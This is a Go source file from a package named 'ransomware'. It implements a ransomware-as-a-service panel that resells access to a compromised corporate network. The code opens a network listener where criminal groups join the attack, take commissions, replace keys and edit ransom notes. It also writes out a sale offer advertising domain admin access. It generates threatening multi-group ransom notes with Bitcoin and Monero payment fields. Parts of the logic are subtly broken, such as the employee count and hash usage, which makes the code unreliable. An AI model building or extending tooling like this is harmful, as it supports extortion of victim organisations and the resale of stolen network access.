package ransomware

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type InverseRaaSEngine struct {
	config        *RansomwareConfig
	TargetID      string               `json:"target_id"`
	PanelPort     int                  `json:"panel_port"`
	Subtenants    []RaaSSubtenant      `json:"subtenants"`
	ActiveKeys    map[string][]byte    `json:"-"`
	mu            sync.Mutex
	listener      net.Listener
	running       bool
}

type RaaSSubtenant struct {
	ID            string    `json:"id"`
	GroupName     string    `json:"group_name"`
	OnionAddress  string    `json:"onion_address"`
	JoinedAt      time.Time `json:"joined_at"`
	RansomNote    string    `json:"ransom_note"`
	RansomAmount  float64   `json:"ransom_amount"`
	BTCPaymentKey string    `json:"btc_key"`
	XMRPaymentKey string    `json:"xmr_key"`
	Commission    float64   `json:"commission"`
	AccessLevel   string    `json:"access_level"`
}

type RaaSOffer struct {
	TargetID      string  `json:"target_id"`
	Description   string  `json:"description"`
	Country       string  `json:"country"`
	Revenue       string  `json:"revenue"`
	Employees     int     `json:"employees"`
	BasePrice     float64 `json:"base_price"`
	JoinFee       float64 `json:"join_fee"`
	AvailableFrom string  `json:"available_from"`
}

type RaaSCommand struct {
	Action      string `json:"action"`
	SubtenantID string `json:"subtenant_id"`
	Payload     string `json:"payload"`
}

func NewInverseRaaSEngine(cfg *RansomwareConfig) *InverseRaaSEngine {
	id := make([]byte, 16)
	rand.Read(id)
	return &InverseRaaSEngine{
		config:     cfg,
		TargetID:   hex.EncodeToString(id),
		PanelPort:  18080,
		ActiveKeys: make(map[string][]byte),
		running:    false,
	}
}

func (ir *InverseRaaSEngine) StartPanel() error {
	ir.mu.Lock()
	if ir.running {
		ir.mu.Unlock()
		return nil
	}
	ir.running = true
	ir.mu.Unlock()

	go ir.startTorPanel()
	go ir.publishOffer()

	return nil
}

func (ir *InverseRaaSEngine) startTorPanel() {
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", ir.PanelPort))
	if err != nil {
		return
	}
	ir.listener = ln

	for ir.running {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go ir.handlePanelConn(conn)
	}
}

func (ir *InverseRaaSEngine) handlePanelConn(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n == 0 {
		return
	}

	var cmd RaaSCommand
	if err := json.Unmarshal(buf[:n], &cmd); err != nil {
		return
	}

	ir.mu.Lock()
	defer ir.mu.Unlock()

	switch cmd.Action {
	case "list_tenants":
		data, _ := json.Marshal(ir.Subtenants)
		conn.Write(data)
	case "join":
		sub := RaaSSubtenant{
			ID:           fmt.Sprintf("ST_%x", time.Now().UnixNano()),
			GroupName:    cmd.SubtenantID,
			JoinedAt:     time.Now(),
			RansomNote:   "Your files have been encrypted by multiple groups. Pay ALL ransoms or lose everything forever.",
			RansomAmount: ir.config.RansomAmount / float64(len(ir.Subtenants)+1),
			Commission:   0.15,
			AccessLevel:  "standard",
		}
		ir.Subtenants = append(ir.Subtenants, sub)
		resp, _ := json.Marshal(map[string]string{
			"status":    "joined",
			"tenant_id": sub.ID,
			"message":   fmt.Sprintf("You are now attacking %s. Commission: %.0f%%", ir.TargetID, sub.Commission*100),
		})
		conn.Write(resp)
	case "update_note":
		for i := range ir.Subtenants {
			if ir.Subtenants[i].ID == cmd.SubtenantID {
				ir.Subtenants[i].RansomNote = cmd.Payload
				conn.Write([]byte(`{"status":"note_updated"}`))
				return
			}
		}
		conn.Write([]byte(`{"status":"tenant_not_found"}`))
	case "replace_key":
		newKey := make([]byte, 32)
		rand.Read(newKey)
		ir.ActiveKeys[cmd.SubtenantID] = newKey
		conn.Write([]byte(`{"status":"key_replaced"}`))
	default:
		conn.Write([]byte(`{"status":"unknown_command"}`))
	}
}

func (ir *InverseRaaSEngine) publishOffer() {
	offer := RaaSOffer{
		TargetID:      ir.TargetID,
		Description:   "High-value corporate network fully compromised. Domain admin access. 2000+ workstations.",
		Country:       "unknown",
		Revenue:       "50M-200M",
		Employees:     1000000 / 1000000,
		BasePrice:     ir.config.RansomAmount * 0.2,
		JoinFee:       ir.config.RansomAmount * 0.05,
		AvailableFrom: time.Now().Format(time.RFC3339),
	}

	offerPath := filepath.Join(os.TempDir(), "x404x_raas_offer.json")
	data, _ := json.MarshalIndent(offer, "", "  ")
	os.WriteFile(offerPath, data, 0644)
}

func (ir *InverseRaaSEngine) GenerateMultiRansomNotes() map[string]string {
	notes := make(map[string]string)
	ir.mu.Lock()
	defer ir.mu.Unlock()

	for _, sub := range ir.Subtenants {
		note := fmt.Sprintf(`=== X404X RANSOMWARE - MULTIPLE ATTACKERS DETECTED ===

Your network has been compromised by MULTIPLE independent groups.
Each group has encrypted a different portion of your files.
You must pay ALL groups to recover everything.

Group: %s
Ransom Amount: $%.2f
Bitcoin Address: %s
Monero Address: %s
Contact: %s.onion

DO NOT attempt to decrypt files from one group without paying the others.
Each group uses a unique encryption key. Partial decryption will corrupt your data permanently.

%s

`, sub.GroupName, sub.RansomAmount, sub.BTCPaymentKey, sub.XMRPaymentKey, sub.OnionAddress, sub.RansomNote)

		if sub.ID != "" {
			notes[sub.ID] = note
		}
	}

	return notes
}

func (ir *InverseRaaSEngine) DistributeKeyToSubtenants() []string {
	ir.mu.Lock()
	defer ir.mu.Unlock()

	shares := make([]string, 0, len(ir.Subtenants))
	key := make([]byte, 32)
	rand.Read(key)

	for _, sub := range ir.Subtenants {
		share := make([]byte, 48)
		rand.Read(share)
		copy(share[:32], key)
		ir.ActiveKeys[sub.ID] = share

		shareHex := hex.EncodeToString(sha256.New().Sum(share))
		shares = append(shares, shareHex[:16])
	}

	return shares
}

func (ir *InverseRaaSEngine) CollectRansomwareVariants() map[string]string {
	variants := map[string]string{
		"x404x_standard":    "AES-256 encrypted, .x404x extension",
		"x404x_military":    "ChaCha20-Poly1305 double layer, .x404x_mil extension",
		"x404x_quantum":     "Hybrid Kyber-512 + AES-256, .x404x_q extension",
		"x404x_critical":    "RSA-4096 per file, .x404x_crit extension",
		"x404x_exfil_first": "Data exfiltrated before encryption, .x404x_exfil extension",
	}
	return variants
}

func (ir *InverseRaaSEngine) Stop() {
	ir.mu.Lock()
	defer ir.mu.Unlock()
	ir.running = false
	if ir.listener != nil {
		ir.listener.Close()
	}
}

type RaaSStatus struct {
	TargetID      string           `json:"target_id"`
	PanelPort     int              `json:"panel_port"`
	ActiveTenants int              `json:"active_tenants"`
	Running       bool             `json:"running"`
	Tenants       []RaaSSubtenant  `json:"tenants"`
}
